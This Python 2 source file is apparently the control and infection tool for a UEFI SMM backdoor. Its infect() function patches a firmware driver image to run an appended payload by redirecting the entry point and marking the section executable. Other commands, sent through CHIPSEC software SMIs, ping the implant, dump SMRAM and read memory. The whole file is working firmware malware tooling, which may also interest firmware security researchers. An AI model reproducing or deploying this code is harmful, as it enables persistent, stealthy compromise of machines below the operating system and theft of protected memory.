import sys, os, shutil
from struct import pack, unpack
from optparse import OptionParser, make_option

CHIPSEC_TOOL_PATH = '/root/chipsec/source/tool'

sys.path.append(CHIPSEC_TOOL_PATH)

# SW SMI command value for communicating with backdoor SMM code
BACKDOOR_SW_SMI_VAL = 0xCC

# SW SMI commands for backdoor
BACKDOOR_SW_DATA_PING           = 0 # test for allive SMM backdoor
BACKDOOR_SW_DATA_READ_PHYS_MEM  = 1 # read physical memory command
BACKDOOR_SW_DATA_READ_VIRT_MEM  = 2 # read virtual memory command
BACKDOOR_SW_DATA_WRITE_PHYS_MEM = 3 # write physical memory command
BACKDOOR_SW_DATA_WRITE_VIRT_MEM = 4 # write virtual memory command
BACKDOOR_SW_DATA_TIMER_ENABLE   = 5 # enable periodic timer handler
BACKDOOR_SW_DATA_TIMER_DISABLE  = 6 # disable periodic timer handler

# See struct _INFECTOR_CONFIG in SmmBackdoor.h
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QI'
INFECTOR_CONFIG_LEN = 8 + 4

# IMAGE_DOS_HEADER.e_res magic constant to mark infected file
INFECTOR_SIGN = 'INFECTED'

# EFI variable with struct _BACKDOOR_INFO physical address
BACKDOOR_INFO_EFI_VAR = 'SmmBackdoorInfo-3a452e85-a7ca-438f-a5cb-ad3a70c5d01b'
BACKDOOR_INFO_FMT = 'QQQ'
BACKDOOR_INFO_LEN = 8 * 3

PAGE_SIZE = 0x1000

cs = None

class Chipsec(object):

    def __init__(self, uefi, mem, ints):

        self.uefi, self.mem, self.ints = uefi, mem, ints

def efi_var_get(name):

    # parse variable name string of name-GUID format
    name = name.split('-')

    return cs.uefi.get_EFI_variable(name[0], '-'.join(name[1:]), None)

efi_var_get_8 = lambda name: unpack('B', efi_var_get(name))[0]
efi_var_get_16 = lambda name: unpack('H', efi_var_get(name))[0]
efi_var_get_32 = lambda name: unpack('I', efi_var_get(name))[0]
efi_var_get_64 = lambda name: unpack('Q', efi_var_get(name))[0]

def mem_read(addr, size): 

    return cs.mem.read_phys_mem(addr, size)

mem_read_8 = lambda addr: unpack('B', mem_read(addr, 1))[0]
mem_read_16 = lambda addr: unpack('H', mem_read(addr, 2))[0]
mem_read_32 = lambda addr: unpack('I', mem_read(addr, 4))[0]
mem_read_64 = lambda addr: unpack('Q', mem_read(addr, 8))[0]

def get_backdoor_info_addr():

    return efi_var_get_64(BACKDOOR_INFO_EFI_VAR)

def get_backdoor_info(addr = None):

    addr = get_backdoor_info_addr() if addr is None else addr

    return unpack(BACKDOOR_INFO_FMT, mem_read(addr, BACKDOOR_INFO_LEN))

def get_backdoor_info_mem(addr = None):

    addr = get_backdoor_info_addr() if addr is None else addr

    return mem_read(addr + PAGE_SIZE, PAGE_SIZE)

def get_smram_info():

    ret = []  
    backdoor_info = get_backdoor_info_addr()  
    addr, size = backdoor_info + BACKDOOR_INFO_LEN, 8 * 4    

    # dump array of EFI_SMRAM_DESCRIPTOR structures
    while True:

        '''
            typedef struct _EFI_SMRAM_DESCRIPTOR 
            {
                EFI_PHYSICAL_ADDRESS PhysicalStart; 
                EFI_PHYSICAL_ADDRESS CpuStart; 
                UINT64 PhysicalSize; 
                UINT64 RegionState;

            } EFI_SMRAM_DESCRIPTOR;
        '''            
        physical_start, cpu_start, physical_size, region_state = \
            unpack('Q' * 4, mem_read(addr, size))            

        if physical_start == 0:

            # no more items
            break

        ret.append(( physical_start, physical_size, region_state ))
        addr += size

    return ret

def send_sw_smi(command, data, arg):

    cs.ints.send_SW_SMI(command, data, 0, 0, arg, 0, 0, 0)

def dump_mem_page(addr, count = None):

    ret = ''
    backdoor_info = get_backdoor_info_addr()
    count = 1 if count is None else count    

    for i in range(count):

        # send read memory page command to SMM code
        page_addr = addr + PAGE_SIZE * i
        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_READ_PHYS_MEM, page_addr)

        _, _, last_status = get_backdoor_info(addr = backdoor_info)
        if last_status != 0:

            raise Exception('SMM backdoor error 0x%.8x' % last_status)

        # copy readed page contents from physical memory
        ret += get_backdoor_info_mem(addr = backdoor_info)

    return ret

def dump_smram():

    try:

        contents = []

        print '[+] Dumping SMRAM regions, this may take a while...'

        # enumerate and dump available SMRAM regions
        for region in get_smram_info():        
            
            region_addr, region_size, _ = region

            # dump region contents
            name = 'SMRAM_dump_%.8x_%.8x.bin' % (region_addr, region_addr + region_size - 1)
            data = dump_mem_page(region_addr, region_size / PAGE_SIZE)

            contents.append(( name, data ))

        # save dumped data to files
        for name, data in contents:

            with open(name, 'wb') as fd:

                print '[+] Creating', name
                fd.write(data) 

    except IOError, why:

        print '[!]', str(why)
        return False

def check_system():    

    try:

        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_PING, 0x31337)

        backdoor_info = get_backdoor_info_addr()
        print '[+] struct _BACKDOOR_INFO physical address is', hex(backdoor_info) 

        calls_count, ticks_count, last_status = get_backdoor_info(addr = backdoor_info)
        print '[+] BackdoorEntry() calls count is %d' % calls_count
        print '[+] PeriodicTimerDispatch2Handler() calls count is %d' % ticks_count
        print '[+] Last status code is 0x%.8x' % last_status

        print '[+] SMRAM map:'

        # enumerate available SMRAM regions
        for region in get_smram_info():        
        
            physical_start, physical_size, region_state = region 

            print '    address = 0x%.8x, size = 0x%.8x, state = 0x%x' % \
                  (physical_start, physical_size, region_state)

        return True

    except IOError, why:

        print '[!]', str(why)
        return False

def infect(src, payload, dst = None):

    import pefile

    def _infector_config_offset(pe):
        
        for section in pe.sections:

            # find .conf section of payload image
            if section.Name[: len(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:

                return section.PointerToRawData

        raise Exception('Unable to find %s section' % INFECTOR_CONFIG_SECTION)

    def _infector_config_get(pe, data):

        offs = _infector_config_offset(pe)
        
        return unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])        

    def _infector_config_set(pe, data, *args):

        offs = _infector_config_offset(pe)

        return data[: offs] + \
               pack(INFECTOR_CONFIG_FMT, *args) + \
               data[offs + INFECTOR_CONFIG_LEN :]

    # load target image
    pe_src = pefile.PE(src)

    # load payload image
    pe_payload = pefile.PE(payload)
    
    if pe_src.DOS_HEADER.e_res == INFECTOR_SIGN:

        raise Exception('%s is already infected' % src)        

    if pe_src.FILE_HEADER.Machine != pe_payload.FILE_HEADER.Machine:

        raise Exception('Architecture missmatch')

    # read payload image data into the string
    data = open(payload, 'rb').read()

    # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
    conf_ep_new, conf_ep_old = _infector_config_get(pe_payload, data)    

    last_section = None
    for section in pe_src.sections:

        # find last section of target image
        last_section = section

    if last_section.Misc_VirtualSize > last_section.SizeOfRawData:

        raise Exception('Last section virtual size must be less or equal than raw size')

    # save original entry point address of target image
    conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint

    # write updated _INFECTOR_CONFIG back to the payload image
    data = _infector_config_set(pe_payload, data, conf_ep_new, conf_ep_old)

    # set new entry point of target image
    pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = \
        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new

    # update last section size
    last_section.SizeOfRawData += len(data)
    last_section.Misc_VirtualSize = last_section.SizeOfRawData

    # make it executable
    last_section.Characteristics = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']

    # update image headers
    pe_src.OPTIONAL_HEADER.SizeOfImage = last_section.VirtualAddress + last_section.Misc_VirtualSize
    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN

    # get infected image data
    data = pe_src.write() + data

    if dst is not None:

        with open(dst, 'wb') as fd:

            # save infected image to the file
            fd.write(data)

    return data

def hexdump(data, width = 16, addr = 0):

    ret = ''

    def quoted(data):

        # replace non-alphanumeric characters
        return ''.join(map(lambda b: b if b.isalnum() else '.', data))

    while data:

        line = data[: width]
        data = data[width :]

        # put hex values
        s = map(lambda b: '%.2x' % ord(b), line)
        s += [ '  ' ] * (width - len(line))

        # put ASCII values
        s = '%s | %s' % (' '.join(s), quoted(line))

        if addr is not None:

            # put address
            s = '%.8x: %s' % (addr, s)
            addr += len(line)

        ret += s + '\n'

    return ret

def chipsec_init():

    global cs

    import chipsec.chipset
    import chipsec.hal.uefi
    import chipsec.hal.physmem
    import chipsec.hal.interrupts

    _cs = chipsec.chipset.cs()
    _cs.init(None, True)
    
    cs = Chipsec(chipsec.hal.uefi.UEFI(_cs.helper),
                 chipsec.hal.physmem.Memory(_cs.helper),
                 chipsec.hal.interrupts.Interrupts(_cs))

def main():    

    option_list = [

        make_option('-i', '--infect', dest = 'infect', default = None,
            help = 'infect existing DXE, SMM or combined driver image'),

        make_option('-p', '--payload', dest = 'payload', default = None,
            help = 'infect payload path'),

        make_option('-o', '--output', dest = 'output', default = None,
            help = 'file path to save infected file'),

        make_option('-t', '--test', dest = 'test', action = 'store_true', default = False,
            help = 'test system for active infection'),

        make_option('-d', '--dump-smram', dest = 'dump_smram', action = 'store_true', default = False,
            help = 'dump SMRAM contents into the file'), 

        make_option('--read-phys', dest = 'read_phys', default = None,
            help = ''),

        make_option('--read-virt', dest = 'read_virt', default = None,
            help = ''),

        make_option('--timer-enable', dest = 'timer_enable', action = 'store_true', default = False,
            help = ''),

        make_option('--timer-disable', dest = 'timer_disable', action = 'store_true', default = False,
            help = '')
    ]

    parser = OptionParser(option_list = option_list)
    (options, args) = parser.parse_args()

    if options.infect is not None:

        if options.payload is None:

            print '[!] --payload must be specified'
            return -1

        print '[+] Target image:', options.infect        
        print '[+] Payload:', options.payload

        if options.output is None:

            backup = options.infect + '.bak'
            options.output = options.infect

            print '[+] Backup:', backup

            # backup original file
            shutil.copyfile(options.infect, backup)

        print '[+] Output file:', options.output

        # infect source file with specified payload
        infect(options.infect, options.payload, dst = options.output) 

        return 0

    elif options.test:

        chipsec_init()
        check_system()

        return 0

    elif options.dump_smram:

        chipsec_init()
        dump_smram()

        return 0

    elif options.read_phys is not None:

        addr = int(options.read_phys, 16)

        chipsec_init()
        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_READ_PHYS_MEM, addr)
        
        print hexdump(get_backdoor_info_mem(), addr = addr)

        return 0

    elif options.read_virt is not None:

        addr = int(options.read_virt, 16)

        chipsec_init()
        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_READ_VIRT_MEM, addr)
        
        print hexdump(get_backdoor_info_mem(), addr = addr)

        return 0

    elif options.timer_enable:

        chipsec_init()
        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_TIMER_ENABLE, 0)
        
        return 0

    elif options.timer_disable:

        chipsec_init()
        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_TIMER_DISABLE, 0)

        return 0    

    else:

        print '[!] No actions specified, try --help'
        return -1

# def end

if __name__ == '__main__':
    
    sys.exit(main())

#
# EoF
#
